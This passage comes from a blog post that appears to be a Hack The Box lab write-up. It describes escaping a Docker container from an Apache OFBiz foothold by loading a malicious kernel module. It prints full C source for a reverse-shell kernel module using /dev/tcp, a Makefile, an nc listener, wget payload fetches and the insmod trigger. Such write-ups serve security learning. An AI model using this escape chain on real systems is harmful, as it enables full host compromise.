+[+] Done!</code></pre><p>I got a connection from <code>10.10.10.238</code> which is the host machine's IP, so I knew this was working:</p><pre><code>10.10.10.238 - - [29/Sep/2021 21:37:38] "GET / HTTP/1.1" 200 -
+</code></pre><p>With RCE on the container, I decided to make enumeration a little easier and faster with a Python script:</p><p>After using this script with some <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Seclists</a>, I couldn't find any relevant files or hints, so I started thinking that this was a straightforward container escape.</p><p>I was also getting a little frustrated with not having a shell into the machine, so I decided to abandon my script and give Metasploit a try.</p><p>After some tweaking, I finally got it:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><hr></hr><h2 id="the-final-step">The final step</h2><p>This was definitely the hardest part. I knew I had to escape from the container, and tried a lot of known exploits without any luck.</p><p>Finally, after a loooong and frustrating process I found <a href="https://xcellerator.github.io/posts/docker_escape/">this</a> article from 2020: "Privileged Container Escapes with Kernel Modules":</p><blockquote>It turns out that privileged containers (or just those with <code>CAP_SYS_MODULE</code>) are able to use the <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_init_module()</code></a> and <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_finit_module()</code></a> syscalls - which are what’s used to load kernel modules. <br />As all containers share their kernel with the host (unlike VMs), this clearly results in yet another complete system compromise.</blockquote><p>This led me to find <a href="https://blog.nody.cc/posts/container-breakouts-part2/">this</a> POC:</p><figure class="kg-card kg-code-card"><pre><code>#include &lt;linux/kmod.h&gt;
+#include &lt;linux/module.h&gt;
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+char* argv[] = {"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/10.10.10.238/4444 0&gt;&amp;1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/8/", NULL };
+static int __init reverse_shell_init(void) {
+return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit reverse_shell_exit(void) {
+printk(KERN_INFO "Exiting\n");
+}
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);</code></pre><figcaption>reverse-shell.c</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>obj-m +=reverse-shell.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</code></pre><figcaption>Makefile</figcaption></figure><p>Note how the reverse shell is targeted at the host machine, on port <code>4444</code>, so we need to setup that listener:</p><pre><code>marcus@monitors:~$ nc -nvlp 4444</code></pre><p>On our machine, let's serve these files so that the container can fetch them using <code>wget</code>:</p><pre><code>~ python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...</code></pre><p>Now, on the Metasploit shell, let's fetch the <code>reverse-shell.c</code> and <code>Makefile</code>, build the payload and trigger it:</p><pre><code>&gt; sessions -i 1
+[*] Starting interaction with 1...
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+root@79931c1ed9a2:/usr/src/apache-ofbiz-17.12.01# whoami
+root
+
+root@79931c1ed9a2:/usr/src/apache-ofbiz-17.12.01# cd /
+
+root@79931c1ed9a2:/# wget http://10.10.14.22:9000/reverse-shell.c
+root@79931c1ed9a2:/# wget http://10.10.14.22:9000/Makefile
+root@79931c1ed9a2:/# export PATH=/usr/lib/gcc/x86_64-linux-gnu/8/:$PATH
+root@79931c1ed9a2:/# make clean
+root@79931c1ed9a2:/# make
+root@79931c1ed9a2:/# insmod reverse-shell.ko</code></pre><p>And that's it!</p><figure class="kg-card kg-image-card"></figure><hr></hr><h2 id="references">References</h2><ul><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></li><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html">https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html</a></li><li><a href="https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/">https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/</a></li><li><a href="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></li><li><a href="https://alexander.holbreich.org/docker-components-explained/">https://alexander.holbreich.org/docker-components-explained/</a></li><li><a href="https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md">https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md</a></li><li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket</a></li><li><a href="https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</a></li><li><a href="https://blog.nody.cc/posts/container-breakouts-part2/">https://blog.nody.cc/posts/container-breakouts-part2/</a></li></ul>
+
+            </section>
+
+        </article>
+    </main>
+    <footer class="page-footer">
+        <h3></h3>
+        <p><a href="../../index.html">Read more posts →</a></p>
+        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"/><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"/><rect y="34" width="84" height="17" rx="4"/><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"/><rect x="67" width="17" height="17" rx="4"/></g></g></svg> Published with Ghost</a>
+    </footer>
+    
+</body>
+</html>
